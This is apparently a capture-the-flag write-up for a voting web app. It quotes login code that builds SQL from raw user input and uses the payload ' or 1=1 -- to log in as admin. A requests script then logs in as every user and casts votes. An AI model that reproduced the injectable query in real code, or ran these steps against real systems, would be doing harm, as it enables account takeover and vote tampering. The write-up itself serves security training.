## Solve

1. Looking at the autheentication code:
```python
def verify_user(username, password):
    conn = get_db_connection()
    cursor = conn.cursor()

    # Note: Fix better verification
    query = f"SELECT * FROM users WHERE username = '{username}' AND password_hash = '{password}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    if result:
        return True
    return False
```
We can clearly see that both the username field and password field should be injectable.

2. We can use `' or 1=1 --` as the password to login as the admin.
3. See flag 1.
4. Lets automate this for every user so we can change their votes.



```python
import requests

password = "' or 1=1 --"


with requests.Session() as s:
    s.post("http://10.212.172.46:30001/login", data={"username": "admin", "password": password})
    usernames = s.get("http://10.212.172.46:30001/users").json()
    print(usernames)


for user in usernames:
    with requests.Session() as s:
        s.post("http://10.212.172.46:30001/login", data={"username": user, "password": password})
        s.post("http://10.212.172.46:30001/vote", data={"candidate": "borat"})

```
Then visit the website as the admin and you are prompted with the flag.